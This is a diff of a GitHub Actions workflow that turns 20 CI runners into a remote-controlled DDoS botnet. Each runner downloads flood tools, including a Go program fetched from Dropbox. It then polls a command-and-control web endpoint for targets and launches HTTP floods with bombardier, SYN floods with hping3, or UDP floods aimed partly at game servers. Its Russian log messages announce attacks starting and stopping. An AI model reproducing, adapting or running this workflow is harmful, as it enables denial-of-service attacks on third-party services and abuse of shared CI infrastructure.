@@ -1,4 +1,4 @@
-name: Ultimate Multi-Tool (Remote Control)
+name: Ultimate Multi-Tool (20 Machines)
 on:
   workflow_dispatch:
 
@@ -11,7 +11,7 @@ jobs:
         runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Install Tools
+      - name: Setup Tools
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq
@@ -19,17 +19,18 @@ jobs:
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
 
-      - name: Run Remote Control Attack
+      - name: Control Loop
         env:
-          CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
+          URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          echo "ОЖИДАНИЕ КОМАНДЫ С САЙТА..."
+          echo "СИСТЕМА ЗАПУЩЕНА. ОЖИДАНИЕ КОМАНД..."
           LAST_ID="0"
           
           while true; do
-            DATA=$(curl -s --max-time 5 "$CONTROL_URL")
+            # Получаем JSON без лишнего мусора
+            DATA=$(curl -s "$URL")
             
-            # Проверяем JSON на валидность
+            # Если это валидный JSON
             if echo "$DATA" | jq -e . >/dev/null 2>&1; then
               ID=$(echo "$DATA" | jq -r '.id // 0')
 
@@ -40,32 +41,31 @@ jobs:
                 PORT=$(echo "$DATA" | jq -r '.port')
                 CONNS=$(echo "$DATA" | jq -r '.conns')
 
-                # Сначала убиваем всё старое
+                # Убиваем старые атаки
                 sudo killall bombardier hping3 go 2>/dev/null || true
                 
                 if [ "$METHOD" == "stop" ]; then
-                   echo "--------------------------------------------------"
-                   echo "АТАКА ОСТАНОВЛЕНА"
-                   echo "--------------------------------------------------"
+                  echo ">>> АТАКА ОСТАНОВЛЕНА <<<"
                 else
-                   # ЛОГ В КОНСОЛЬ (как ты просил)
-                   echo "--------------------------------------------------"
-                   echo "Атака запущена на $TARGET (Метод: $METHOD)"
-                   echo "Машина №${{ matrix.runner }}"
-                   echo "--------------------------------------------------"
+                  # ТОТ САМЫЙ ЛОГ
+                  echo "=================================================="
+                  echo "АТАКА ЗАПУЩЕНА НА: $TARGET"
+                  echo "МЕТОД: $METHOD | МАШИНА: ${{ matrix.runner }}"
+                  echo "=================================================="
 
-                   if [ "$METHOD" == "http" ]; then
-                     while true; do bombardier -c $CONNS -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
-                   
-                   elif [ "$METHOD" == "tcp" ]; then
-                     sudo hping3 --flood -S -p $PORT $TARGET &
-                   
-                   elif [ "$METHOD" == "udp" ]; then
-                     go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
-                   
-                   elif [ "$METHOD" == "udp-ddnet" ]; then
-                     go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
-                   fi
+                  # ЛОГИКА ИЗ ТВОЕГО КОДА
+                  if [ "$METHOD" == "http" ]; then
+                    while true; do bombardier -c 1000 -d 300s --http2 -l "$TARGET?cache=$RANDOM"; done &
+                  
+                  elif [ "$METHOD" == "tcp" ]; then
+                    sudo hping3 --flood -S -p $PORT $TARGET &
+                  
+                  elif [ "$METHOD" == "udp" ]; then
+                    go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 300s -r 0 -t 1s &
+                  
+                  elif [ "$METHOD" == "udp-ddnet" ]; then
+                    go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 300s -r 0 -t 1s &
+                  fi
                 fi
               fi
             fi
